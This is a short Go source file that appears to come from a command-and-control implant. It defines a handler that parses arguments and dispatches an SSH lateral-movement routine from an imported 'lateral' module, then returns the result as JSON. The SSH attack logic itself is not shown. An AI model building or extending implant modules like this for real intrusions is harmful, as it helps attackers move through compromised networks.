package main

import (
	"context"
	"fmt"

	"github.com/azizbinmohammad/private-c2/implant/modules/lateral"
)

func handleLateralSSH(ctx context.Context, args string) (string, error) {
	req, err := lateral.ParseSSHRequest(args)
	if err != nil {
		return "", err
	}
	result, err := lateral.SSH(ctx, req)
	if err != nil {
		return "", err
	}
	out, err := marshalJSON(result)
	if err != nil {
		return "", fmt.Errorf("encoding lateral_ssh result: %w", err)
	}
	return out, nil
}
